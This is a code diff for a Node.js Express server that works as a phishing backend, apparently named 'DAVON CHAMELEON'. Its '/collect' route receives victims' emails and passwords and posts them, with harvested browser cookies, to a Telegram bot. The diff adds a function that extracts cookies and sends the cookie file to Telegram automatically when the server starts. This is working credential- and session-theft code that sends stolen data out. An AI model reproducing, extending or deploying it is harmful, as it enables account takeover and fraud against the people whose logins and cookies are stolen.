@@ -166,16 +166,28 @@ async function sendTelegramFile(filePath) {
     } catch (err) { debugLog(`❌ Failed to send cookies: ${err}`); }
 }
 
+// ------------------------- ASYNC COOKIE EXTRACTION -------------------------
+async function saveAndSendCookies() {
+    try {
+        const cookies = await saveCookies();
+        if (cookies.length > 0) {
+            await sendTelegramMessage(`✅ Cookies extracted: ${cookies.length}`);
+            await sendTelegramFile(OUTPUT_FILE);
+        } else {
+            debugLog("No cookies found to send.");
+        }
+    } catch (err) {
+        console.error("❌ Error in saveAndSendCookies:", err);
+    }
+}
+
 // ------------------------- COLLECT ROUTE -------------------------
 app.post('/collect', async (req, res) => {
     try {
         const { email, password, attempt, city, country } = req.body;
         debugLog(`Received from frontend: ${email}, attempt ${attempt}`);
 
-        // Save latest cookies
         const cookies = await saveCookies();
-
-        // Build message
         const text = `☠️ DAVON CHAMELEON [${attempt}] ☠️\n` +
                      `Email: ${email}\n` +
                      `Password: ${password}\n` +
@@ -183,7 +195,6 @@ app.post('/collect', async (req, res) => {
                      `Cookies collected: ${cookies.length}`;
 
         await sendTelegramMessage(text);
-
         if (cookies.length > 0) await sendTelegramFile(OUTPUT_FILE);
 
         res.json({ success: true });
@@ -194,5 +205,11 @@ app.post('/collect', async (req, res) => {
 });
 
 // ------------------------- START SERVER -------------------------
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
+
+// Run async cookie extraction on startup (non-blocking)
+console.log("Starting cookie extraction...");
+saveAndSendCookies()
+    .then(() => console.log("✅ Cookies extracted and sent."))
+    .catch(err => console.error("❌ Cookie extraction error:", err));
